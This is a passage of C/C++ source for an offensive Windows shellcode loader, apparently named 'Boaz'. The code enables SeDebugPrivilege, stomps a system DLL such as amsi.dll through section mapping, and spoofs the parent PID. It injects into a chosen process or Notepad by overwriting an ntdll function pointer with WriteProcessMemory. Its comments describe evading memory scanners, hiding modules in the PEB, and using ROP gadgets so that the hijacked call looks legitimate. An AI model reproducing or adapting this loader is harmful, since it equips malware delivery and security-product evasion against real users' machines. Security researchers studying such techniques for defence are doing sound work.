        /// alert test need a alertable thread, which means if thread is alerted, we need resume thread to 
        /// make it alertable again. 
        // PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)pAddress;
        // myNtTestAlert testAlert = (myNtTestAlert)dynamic::NotGetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert");
        // NTSTATUS result = pNtQueueApcThread(
        //     hThread,  
        //     NULL,  
        //     apcFlags,  
        //     (PVOID)apcRoutine,  
        //     (PVOID)0,  
        //     (PVOID)0,  
        //     (PVOID)0 
        //     );

        // if(!testAlert) {
        //     printf("[-] Failed to locate alert test nt.\n");
        //     return 1;
        // } else {
        //     printf("[+] Alert tested\n");
        // }
    }

    // CloseHandle(hThread);
    return 0;
}


BOOL EnableWindowsPrivilege(const wchar_t* Privilege) {
    HANDLE token;
    TOKEN_PRIVILEGES priv;
    BOOL ret = FALSE;
    wprintf(L" [+] Enable %ls adequate privilege\n", Privilege);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        priv.PrivilegeCount = 1;
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        // if (LookupPrivilegeValue(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
        if (LookupPrivilegeValueW(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
            AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE) {
            ret = TRUE;
        }

        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { // In case privilege is not part of token (e.g. run as non-admin)
            ret = FALSE;
        }

        CloseHandle(token);
    }

    if (ret == TRUE)
        wprintf(L" [+] Success\n");
    else
        wprintf(L" [-] Failure\n");

    return ret;
}

////////////////////////////////////////
typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);

BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}

///// VMT Hooking: 

DWORD InstallHook()
{
	BYTE *pModuleBase = NULL;

	// get base address of kernelbase.dll
	// pModuleBase = (BYTE*)GetModuleHandle("kernelbase.dll");
	// pModuleBase = (BYTE*)GetModuleHandle("gdi32full.dll");
    //kernel32:
    // pModuleBase = (BYTE*)GetModuleHandle("kernel32.dll");
    // printf("[+] kernel32 is at: %p\n", pModuleBase);

    pModuleBase = (BYTE*)GetModuleHandle("ntdll.dll");

	if(pModuleBase == NULL)
	{
		return 1;
	}

	// get ptr to function reference
	// pHookAddr = pModuleBase + 0x1DF650;
    // Instruction 0x00007ff950e94a10 referenced at gdi32full.dll!0x00007ff950f2c1b8 (sect: .data, virt_addr: 0xFC1B8, stack delta: 0xA10)

    // Instruction 0x00007ff950a36ec0 referenced at gdi32full.dll!0x00007ff950f2c058 (sect: .data, virt_addr: 0xFC058, stack delta: 0xA40)
    pHookAddr = pModuleBase + 0x183EF0; //in ntdll.dll
    //Instruction 0x00007ff953640a90 referenced at KERNEL32.DLL!0x00007ff951eb7ce8 (sect: .data, virt_addr: 0xB7CE8, stack delta: 0x9A0)
    // pHookAddr = pModuleBase + 0xB7CE8; //kernel32!RtlQueryFeatureConfiguration


// Instruction 0x00007ff950e443b0 referenced at USER32.dll!0x00007ff951816240 (sect: .data, virt_addr: 0xB6240, stack delta: 0x8F0)
    printf("[+] pHookAddr is at: %p\n", pHookAddr);
    printf("[+] *(DWORD_PTR*)pHookAddr is at: %p\n", *(DWORD_PTR*)pHookAddr);
    // // apply page guard to hooked VMT entry: 
	// DWORD old = 0;
    // if(VirtualProtect(reinterpret_cast<LPVOID>(pHookAddr), 1, PAGE_READWRITE | PAGE_GUARD, &old)) {
    //     printf("[+] PAGE_GUARD set before pHookAddr API. \n");
    // } else {
    //     printf("[-] Failed to set PAGE_GUARD\n");
    // }

    // // add vectorexceptionhanlder:
    // AddVectoredExceptionHandler(1, &BreakpointHandler_veh);
    // AddVectoredContinueHandler(1, &BreakpointHandler_vch);

	// store original value
	// dwGlobal_OrigReferenceAddr = *(DWORD*)pHookAddr;
    dwGlobal_OrigReferenceAddr = *(DWORD_PTR*)pHookAddr;
    printf("[+] dwGlobal_OrigReferenceAddr is: %p\n", dwGlobal_OrigReferenceAddr);


    printf("[+] memory scan now. \n");
    getchar();
	// overwrite virtual method ptr to call HookStub
	// *(DWORD*)pHookAddr = (DWORD)HookStub;
    // TODO: 
    // There are 2 ways to execute at our DLL entry point, the first is to invoke it in the HookStub function,
    *(DWORD_PTR*)pHookAddr = (DWORD_PTR)HookStub;
    // The second is to pass the addr of dll entry point to the VMT global Ptr.
    // VMT global Ptr will call it for us. 
    // *(DWORD_PTR*)pHookAddr = (DWORD_PTR)DllEntryGlobal;
    printf("[+] memory scan now. The VMT Ptr has been replaced. \n");
    getchar();

    printf("[+] *(DWORD_PTR*)pHookAddr after change: %p\n", *(DWORD_PTR*)pHookAddr);

	return 0;
}


DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength, BOOL useRtlCreateUserThread, BOOL bUseCreateThreadpoolWait);

DWORD InstallHookRemote()
{
	BYTE *pModuleBase = NULL;

	// get base address of kernelbase.dll
	// pModuleBase = (BYTE*)GetModuleHandle("kernelbase.dll");
	// pModuleBase = (BYTE*)GetModuleHandle("gdi32full.dll");
    //kernel32:
    // pModuleBase = (BYTE*)GetModuleHandle("kernel32.dll");
    // printf("[+] kernel32 is at: %p\n", pModuleBase);

    // pModuleBase = (BYTE*)GetModuleHandle("ntdll.dll"); ///replace this with custom ntdll get function TODO: 
    pModuleBase = (BYTE*)GetNtdllBase();

	if(pModuleBase == NULL)
	{
		return 1;
	}

	// get ptr to function reference
	// pHookAddr = pModuleBase + 0x1DF650;
    // Instruction 0x00007ff950e94a10 referenced at gdi32full.dll!0x00007ff950f2c1b8 (sect: .data, virt_addr: 0xFC1B8, stack delta: 0xA10)

    // Instruction 0x00007ff950a36ec0 referenced at gdi32full.dll!0x00007ff950f2c058 (sect: .data, virt_addr: 0xFC058, stack delta: 0xA40)
    pHookAddr = pModuleBase + 0x183EF0; //in ntdll.dll
    //Instruction 0x00007ff953640a90 referenced at KERNEL32.DLL!0x00007ff951eb7ce8 (sect: .data, virt_addr: 0xB7CE8, stack delta: 0x9A0)
    // pHookAddr = pModuleBase + 0xB7CE8; //kernel32!RtlQueryFeatureConfiguration


// Instruction 0x00007ff950e443b0 referenced at USER32.dll!0x00007ff951816240 (sect: .data, virt_addr: 0xB6240, stack delta: 0x8F0)
    printf("[+] VMT Ptr is at: %p\n", pHookAddr);
    printf("[+] VMT Ptr before change: %p\n", *(DWORD_PTR*)pHookAddr);

	// store original value
    dwGlobal_OrigReferenceAddr = *(DWORD_PTR*)pHookAddr;
    printf("[+] dwGlobal_OrigReferenceAddr is: %p\n", dwGlobal_OrigReferenceAddr);
    //print &DllEntryGlobal:
    printf("[+] DllEntryGlobal is at: %p\n", &DllEntryGlobal);

    printf("[+] memory scan now. \n");
    getchar();
	// overwrite virtual method ptr to call HookStub
	// *(DWORD*)pHookAddr = (DWORD)HookStub;
    // TODO: 
    // There are 2 ways to execute at our DLL entry point, the first is to invoke it in the HookStub function,
    // *(DWORD_PTR*)pHookAddr = (DWORD_PTR)HookStub;
    // The second is to pass the addr of dll entry point to the VMT global Ptr.
    // VMT global Ptr will call it for us. 
    // *(DWORD_PTR*)pHookAddr = (DWORD_PTR)DllEntryGlobal;

    /// Set workers and use custom stack to write memory:
	// const char libName[] = { 'n', 't', 'd', 'l', 'l', 0 };
    // const char NtWriteFuture[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    // FARPROC pTpAllocWork = GetProcAddress(GetModuleHandleA(libName), "TpAllocWork");
    // FARPROC pTpPostWork = GetProcAddress(GetModuleHandleA(libName), "TpPostWork");
    // FARPROC pTpReleaseWork = GetProcAddress(GetModuleHandleA(libName), "TpReleaseWork");

    // ULONG bytesWritten = 0;
    // NTWRITEVIRTUALMEMORY_ARGS ntWriteVirtualMemoryArgs = { 0 };
    // ntWriteVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA(libName), NtWriteFuture);
    // ntWriteVirtualMemoryArgs.hProcess = hProcess;
    // ntWriteVirtualMemoryArgs.address = (LPVOID)pHookAddr;
    // ntWriteVirtualMemoryArgs.buffer = &dllEntryPoint;
    // ntWriteVirtualMemoryArgs.size = sizeof(DWORD_PTR);
    // ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;

    // // // // / Set workers

    // PTP_WORK WorkReturn2 = NULL;
    // // getchar();
    // ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL);
    // ((TPPOSTWORK)pTpPostWork)(WorkReturn2);
    // ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);
    // printf("Bytes written: %lu\n", bytesWritten);


    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, (LPVOID)pHookAddr, &DllEntryGlobal, sizeof(DWORD_PTR), &bytesWritten)) {
        printf("[-] Failed to write memory. Error: %lu\n", GetLastError());
    } else {
        printf("[+] Pointer value successfully written to the address that pHookAddr points to in the remote process.\n");
    }

    if (bytesWritten != sizeof(DWORD_PTR)) {
        printf("[-] Incorrect number of bytes written. Expected: %zu Got: %zu\n", sizeof(DWORD_PTR), bytesWritten);
        printf("[-] bytesWritten: %zu\n", bytesWritten);
    } else {
        printf("[+] Successfully wrote the correct number of bytes.\n");
        printf("[-] bytesWritten: %zu\n", bytesWritten);
        printf("[+] VMT Ptr after change: %p\n", *(DWORD_PTR*)pHookAddr);

    }

    // There is however, another trick. We can find the Rop gadgets that has a JMP opcode to 
    // any addr 0xAABBCCDD. We can use this to jump to our DllEntryGlobal by replacing 0xAABBCCDD with DllEntryGlobal. 
    // Then we can overwrite the VMT Ptr with the addr of the Rop gadget. The RoP gadegt can be found within 
    // .text section of a legitimate module. Therefore, it is legitimate for the VMT Ptr to "call" code in .text section. 


//     const char getLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
//     const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };
//     NtQueueApcThreadEx2_t pNtQueueApcThread = (NtQueueApcThreadEx2_t)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtQueueFutureApcEx2Str);
//     // create a thread using create remote thread and call the function

// // print hProcess:
//     // printf("[+] hProcess is at: %p\n", hProcess);
//     QUEUE_USER_APC_FLAGS apcFlags = QUEUE_USER_APC_FLAGS_NONE;
    
//     DWORD threadId;
//     // memmove: 
    // HANDLE hThread = CreateRemoteThread(
    //         hProcess,          // Handle to the target process
    //         NULL,              // Default security attributes
    //         0,                 // Stack size (0 = default)
    //         (LPTHREAD_START_ROUTINE)ExitThread,  // Thread start routine (ExitThread)
    //         NULL,              // Thread parameter (None, since ExitThread takes no parameters)
    //         CREATE_SUSPENDED,                 // Creation flags
    //         &threadId          // Thread ID
    // );
    // NTSTATUS status = pNtQueueApcThread(hThread, NULL, apcFlags, (PVOID)GetProcAddress((HMODULE)pModuleBase, "memmove"), (void*)pHookAddr, (void*)&DllEntryGlobal, (void*)sizeof(DWORD_PTR));

    // if(status != STATUS_SUCCESS) {
    //     printf("[-] Failed to queue APC Ex2. NTSTATUS: 0x%X\n", status);
    // } else {
    //     printf("[+] APC Ex2 queued successfully\n");
    // }
    // //resume thread:
    // ResumeThread(hThread);
    // WaitForSingleObject(hThread, INFINITE);

    // BOOL result = WriteProcessMemoryAPC(hProcess, (BYTE*)*(DWORD_PTR*)pHookAddr, (BYTE*)&DllEntryGlobal, sizeof(DWORD_PTR), bUseRtlCreateUserThread, bUseCreateThreadpoolWait); 
    // if(result != 0) {
    //     printf("[+] Pointer value successfully written to the address that pHookAddr points to in the remote process.\n");
    // } else {
    //     printf("[-] Failed to write memory. Error: %lu\n", GetLastError());
    // }
    
    printf("[+] memory scan now. The VMT Ptr has been replaced. \n");
    getchar();


    printf("[+] Pointer value successfully written to the address that pHookAddr points to in the remote process.\n");


    printf("[+] memory scan now. The VMT Ptr has been replaced. \n");
    getchar();

    printf("[+] *(DWORD_PTR*)pHookAddr after change: %p\n", *(DWORD_PTR*)pHookAddr);

	return 0;
}

////////////////////////////////////////

unsigned char magiccode[] = ####SHELLCODE####;

int main(int argc, char *argv[])
{
    printf("Starting Boaz custom loader...\n");
    if (!EnableWindowsPrivilege(L"SeDebugPrivilege")) {
        printf("[-]Failed to enable SeDebugPrivilege. You might not have sufficient permissions.\n");
        return -1;
    } else {
        printf("[+] SeDebugPrivilege enabled.\n");
    }


    // Default value for bTxF
    BOOL bTxF = FALSE, bUseCustomDLL = FALSE; // Flag to indicate whether to search for a suitable DLL
    int dllOrder = 1; // Default to the first suitable DLL

    BOOL bUseLdrLoadDll = FALSE; // Default to FALSE
    BOOL bUseDotnet = FALSE; // Default to FALSE
    BOOL bUseAddPebList = FALSE; // Default to FALSE
    ULONG_PTR ppid = 0; // Initialize ppid
    BOOL bPpid = FALSE; // Default to FALSE

    // Add new option to enable remote injection
    // Remote injection not support LdrLoadDll at the moment, it can be added later by 
    // executing this command with createRemoteThread triggered by callback function.
    BOOL bRemoteInjection = FALSE; // Default to FALSE
    //TODO: 


    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0) {
            PrintUsageAndExit();
            return 0; 
        }
        
        if (i + 1 < argc && strcmp(argv[i], "-dll") == 0) {
            dllOrder = atoi(argv[i + 1]);
            bUseCustomDLL = TRUE;
            i++; // Skip next argument as it's already processed
        } else if (strcmp(argv[i], "-txf") == 0) {
            bTxF = TRUE;
        } else if (strcmp(argv[i], "-thread") == 0) {
            bUseRtlCreateUserThread = TRUE;
        } else if (strcmp(argv[i], "-pool") == 0) {
            bUseCreateThreadpoolWait = TRUE;
        } else if (strcmp(argv[i], "-ldr") == 0) {
            bUseLdrLoadDll = TRUE;
        } else if (strcmp(argv[i], "-peb") == 0) {
            bUseAddPebList = TRUE;
        } else if (strcmp(argv[i], "-remote") == 0) {
            bRemoteInjection = TRUE;
        } else if (i + 1 < argc && strcmp(argv[i], "-ppid") == 0) {
            // Parse the next argument as an integer for ppid
            ppid = atoi(argv[i + 1]);  // Convert string to integer
            if (ppid <= 0) {
                printf("[-] Invalid PID: %s\n", argv[i + 1]);
                return 1;
            } else {
                printf("[+] Parent PID: %lu\n", ppid);
            }
            bPpid = TRUE;
            i++; // Skip next argument as it's already processed
        } else if (strcmp(argv[i], "-dotnet") == 0) {
            if(bUseCustomDLL) {
                bUseDotnet = TRUE;
            } else {
                printf("[-] -dotnet flag can only be used after -dll flag. Exiting.\n");
                return 1;
            }
        } else if (strcmp(argv[i], "-a") == 0) {
            bUseNoAccess = TRUE;
        } else {
            printf("[-] Invalid argument: %s\n", argv[i]);
            return 1;
        }

        // Check for mutual exclusivity early
        if (bUseCreateThreadpoolWait && bUseRtlCreateUserThread) {
            printf("[-] Both -thread and -pool flags cannot be used together. Exiting.\n");
            return 1;
        }
    }


    if(bUseCreateThreadpoolWait) {
        printf("[+] Using CreateThreadpoolWait function for APC write.\n");
    } else {
        // print whether use alternative thread calling function, printf which method will be used:
        printf("[+] Using %s thread calling function.\n", bUseRtlCreateUserThread ? "RtlCreateUserThread" : "NtCreateThreadEx for APC write.");
    }

    // Display debug message about transaction mode
    printf("[+] Transaction Mode: %s\n", bTxF ? "Enabled" : "Disabled");

    if (bUseNoAccess) {
        printf("[+] No access mode enabled to evade memory scanner.\n");
    }

    LoadNtFunctions(); // Load the NT functions

    wchar_t dllPath[MAX_PATH] = {0}; // Buffer to store the path of the chosen DLL

    // bool useDotnet = TRUE; //This option can be made available to commandline options TODO: 
    if (bUseCustomDLL) {
        DWORD requiredSize = sizeof(magiccode); // Calculate the required size based on the magiccode array size
        printf("[+] Required size: %lu bytes\n", requiredSize);

        // Attempt to find a suitable DLL, now passing the calculated requiredSize
        if (!FindSuitableDLL(dllPath, sizeof(dllPath) / sizeof(wchar_t), requiredSize, bTxF, dllOrder, bUseDotnet)) {
            wprintf(L"[-] No suitable DLL found in the specified order. Falling back to default.\n");
            wcscpy_s(dllPath, L"C:\\windows\\system32\\amsi.dll"); // Default to amsi.dll
        } else {
            // wprintf(L"Using DLL: %s\n", dllPath);
        }
    } else {
        printf("[-] No custom DLL specified. Falling back to amsi.dll.\n");
        wcscpy_s(dllPath, L"C:\\windows\\system32\\amsi.dll"); // Use the default amsi.dll
    }

    wprintf(L"[+] Using DLL: %ls\n", dllPath);
    wprintf(L"[+] TxF Mode: %ls\n", bTxF ? L"Enabled" : L"Disabled");


    BOOL success = block_dlls_local();

    if(!success) {
        printf("[-] Failed to block DLLs. Exiting.\n");
        return 1;
    } else {
        printf("[+] DLLs blocked successfully.\n");
    }

    // HANDLE hProcess = NULL; 
    // check bRemoteInjection
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    /// ACG, and PPID: 
    STARTUPINFOEXA SI;
    ZeroMemory(&SI, sizeof(SI));
    SI.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    SI.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	HANDLE parentProc = NULL;
    // set up blocking policy. 
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute

	// DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON;
	DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY2_MODULE_TAMPERING_PROTECTION_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_DEP_ATL_THUNK_ENABLE + PROCESS_CREATION_MITIGATION_POLICY_SEHOP_ENABLE + PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_REMOTE_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_LOW_LABEL_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_ON;
    // PROCESS_CREATION_MITIGATION_POLICY_FORCE_RELOCATE_IMAGES_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_STRICT_HANDLE_CHECKS_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_HIGH_ENTROPY_ASLR_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_ON

	// Initializing OBJECT_ATTRIBUTES and CLIENT_ID struct
	OBJECT_ATTRIBUTES pObjectAttributes;
	InitializeObjectAttributes(&pObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID pClientId;
	pClientId.UniqueProcess = (PVOID)ppid;
	pClientId.UniqueThread = (PVOID)0;

    if(bPpid) {
        NTSTATUS sTart = NtOpenFuture(&parentProc, PROCESS_CREATE_PROCESS, &pObjectAttributes, &pClientId);

        if(sTart != STATUS_SUCCESS) {
            printf("[-] Failed to open parent process. Error: 0x%X\n", sTart);
            return 1;
        } else {
            printf("[+] Parent process opened successfully.\n");
        }

        // Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocated
        SIZE_T size = 0;
        InitializeProcThreadAttributeList(NULL, 2, 0, &size);

        // Allocate memory for PROC_THREAD_ATTRIBUTE_LIST
        SI.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);

        // Initialise our list 
        InitializeProcThreadAttributeList(SI.lpAttributeList, 2, 0, &size);

        // Assign parent pid attribute to attribute list
        UpdateProcThreadAttribute(SI.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProc, sizeof(HANDLE), NULL, NULL);

        // Assign mitigation policies to new process include dynamic code guard, and block non-microsoft binaries, etc.
        UpdateProcThreadAttribute(SI.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(HANDLE), NULL, NULL);
        /// MP, and PPID: 
    }
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    DWORD pid = 0;
    char notepadPath[256] = {0};  // Initialize the buffer
    if(bRemoteInjection) {

        // Get the process ID from the user
        printf("Enter the process ID: ");
        char input[MAX_INPUT_SIZE];

        
        // Use fgets to get the input, allowing for empty input (pressing Enter)
        if (fgets(input, MAX_INPUT_SIZE, stdin) != NULL) {
            // Remove the trailing newline character from the input
            input[strcspn(input, "\n")] = 0;

            // Check if the input is empty (user just pressed Enter) or invalid (non-numeric)
            if (strlen(input) == 0 || sscanf(input, "%d", &pid) != 1) {
                // If empty input or invalid input (non-numeric), launch Notepad
                printf("[-] Invalid or no PID provided. Starting Notepad...\n");

                // Determine the correct Notepad path based on system architecture
                if (IsSystem64Bit()) {
                    strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
                    // strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\RuntimeBroker.exe");
                } else {
                    strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
                }

                // PPID: 
                if(!bPpid) {
                    // Attempt to create Notepad process
                    if (CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                        printf("[+] Notepad started with PID: %d\n", pi.dwProcessId);
                        hProcess = pi.hProcess;  // Store Notepad handle
                    } else {
                        MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
                        return 1;
                    }
                } else {
                    // Attempt to create Notepad process
                    if (CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &SI.StartupInfo, &pi)) {
                        printf("[+] Secured Notepad started with PID: %d\n", pi.dwProcessId);
                        hProcess = pi.hProcess;  // Store Notepad handle
                    } else {
                        MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
                        return 1;
                    }
                }

            } else {
                // Valid PID input, try to open the process
                hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
                if (hProcess == NULL) {
                    printf("[-] Failed to open process with PID: %d\n", pid);
                    return 1;
                } else {
                    printf("[+] Opened process with PID: %d\n", pid);
                }
            }
        }

    } else {
        // If bRemoteInjection is FALSE, we open the current process
        printf("[*] bRemoteInjection is FALSE. Opening current process.\n");
        hProcess = GetCurrentProcess();
    }

    ///printf hProcess:
    printf("[+] hProcess: %p\n", hProcess);
    // print process ID:
    printf("[+] Process ID: %d\n", GetProcessId(hProcess));


    /// deal with TxF argument
    HANDLE fileHandle;
    if (bTxF) {
        OBJECT_ATTRIBUTES ObjAttr = { sizeof(OBJECT_ATTRIBUTES) };
        HANDLE hTransaction;
        NTSTATUS NtStatus = NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &ObjAttr, nullptr, nullptr, 0, 0, 0, nullptr, nullptr);
        if (!NT_SUCCESS(NtStatus)) {
            printf("[-] Failed to create transaction (error 0x%x)\n", NtStatus);
            return 1;
        }

        // Display debug message about creating transaction
        printf("[+] Transaction created successfully.\n");
        
        fileHandle = CreateFileTransactedW(dllPath, GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr, hTransaction, nullptr, nullptr);
        // fileHandle = CreateFileTransactedW(dllPath, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr, hTransaction, nullptr, nullptr);
        if (fileHandle == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to open DLL file transacted. Error: %lu\n", GetLastError());
            CloseHandle(hTransaction);
            return 1;
        }

        // Display debug message about opening DLL file transacted
        printf("[+] DLL file opened transacted successfully.\n");
    } else {
        fileHandle = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (fileHandle == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to open DLL file. Error: %lu\n", GetLastError());
            return 1;
        }

        // Display debug message about opening DLL file
        printf("[+] DLL file opened successfully.\n");
    }

    LONG status = 0;
    HANDLE fileBase = NULL;
    HANDLE fileBaseRemote = NULL;
    HANDLE hSection = NULL;
    HANDLE hSectionRemote = NULL;

    if(bUseLdrLoadDll) {
        printf("[+] Using LdrLoadDll function.\n");

        UNICODE_STRING UnicodeDllPath;
        ManualInitUnicodeString(&UnicodeDllPath, dllPath);
        NTSTATUS status = LdrLoadDll(NULL, 0, &UnicodeDllPath, &fileBase);  // Load the DLL

        if (NT_SUCCESS(status)) {
            printf("[!] LdrLoadDll loaded successfully.\n");
        } else {
            printf("[-] LdrLoadDll failed. Status: %x\n", status);
        }
    } else {

        printf("[+] Using mapped DLL with missing PEB (NtCreateSection and NtMapViewOfSection).\n");
        // Create a section from the file
        // LONG status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
        status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
        if (status != 0) {
            printf("NtCreateSection failed. Status: %x\n", status);
            CloseHandle(fileHandle);
            return 1;
        }

        // Map the section into the process
        // PVOID fileBase = NULL;
        SIZE_T viewSize = 0;
        status = NtMapViewOfSection(hSection, GetCurrentProcess(), (PVOID*)&fileBase, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);
        if (status != 0) {
            printf("NtMapViewOfSection failed. Status: %x\n", status);
            CloseHandle(hSection);
            CloseHandle(fileHandle);
            return 1;
        } else {
            printf("[+] Section mapped successfully.\n");
            //print fileBase:
            printf("[+] fileBase: %p\n", fileBase);
            //print view size:
            printf("[+] viewSize: %lu\n", viewSize);
        }

        // // Step 4: Duplicate the section handle for the remote process
        // if (!DuplicateHandle(
        //         GetCurrentProcess(),
        //         hSection,
        //         hProcess,
        //         &hSectionRemote,
        //         0,
        //         FALSE,
        //         DUPLICATE_SAME_ACCESS
        //     )) {
        //     printf("[-] Failed to duplicate handle for the remote process. Error: %x\n", GetLastError());
        //     return 1;
        // } else {
        //     printf("[+] Section handle duplicated successfully.\n");
        // }
	// ZwMapViewOfSection(secHandle, pi.hProcess, &sectionBaseAddressCreatedProcess, NULL, NULL, NULL, &viewSizeCreatedPrcess, ViewShare, NULL, PAGE_EXECUTE_WRITECOPY);

        if(bRemoteInjection) {
            status = NtMapViewOfSection(hSection, hProcess, (PVOID*)&fileBaseRemote, 0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_WRITECOPY);
            if (status != 0) {
                printf("NtMapViewOfSection failed. Status: %x\n", status);
                CloseHandle(hSectionRemote);
                CloseHandle(fileHandle);
                return 1;
            } else {
                printf("[+] Section mapped to remote process successfully.\n");
                //print fileBaseRemote:
                printf("[+] fileBaseRemote: %p\n", fileBaseRemote);
                printf("[+] viewSize: %lu\n", viewSize);
            }
        }

        // status = NtUnmapViewOfSection(GetCurrentProcess(), fileBase);
        // if(status != 0) {
        //     printf("NtUnmapViewOfSection failed. Status: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Local Process section unmapped successfully.\n");
        // }
        printf("[+] press any key to continue\n");
        getchar();
    }


    printf("[!] Before add our module to the PEB lists. \n");
    printf("[!] press any key to continue\n");
    getchar();
    if(!bUseLdrLoadDll) {
        if(bUseAddPebList) {
            const wchar_t* dllName = GetDllNameFromPath(dllPath);

            bool bAddModuleToPEB = AddModuleToPEB((PBYTE)fileBase, dllPath, (LPWSTR)dllName, (ULONG_PTR)fileBase);
            if(bAddModuleToPEB) {
                printf("[+] AddModuleToPEB succeeded\n");
                wprintf(L"DLL %ls added to PEB lists\n", dllPath);
            } else {
                printf("[-] AddModuleToPEB failed\n");
            }
        }
    }
    printf("[!] press any key to continue\n");
    getchar();



    // for NtCreateSection and NtMapViewOfSection
    // PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBase;
    // PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
    // DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;


    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBase;
    printf("[+] DOS header: %p\n", dosHeader);
